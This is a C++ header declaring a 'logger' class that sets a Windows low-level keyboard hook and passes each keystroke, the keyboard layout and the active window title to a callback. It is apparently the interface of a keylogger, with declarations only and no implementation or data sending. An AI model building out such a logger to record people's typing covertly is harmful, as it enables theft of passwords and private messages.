#pragma once
#include "windows.h"

class logger
{
public:

	typedef void(*KCBCK)(
		KBDLLHOOKSTRUCT _KeyStruct,
		HKL _KeyboardLayout,
		LPCWSTR _WindowTitle);

	logger();
	~logger();

	void bindKeyCallback(KCBCK _Fn) noexcept;

	int  use();
	void disuse();

private:

	HHOOK	_Hook;
	HKL		_KeyboardLayout;
	KCBCK	_KeyCallback;
	static logger* _ActiveLoggerPtr;

	static LRESULT hookCallback(int nCode, WPARAM wParam, LPARAM lParam);
};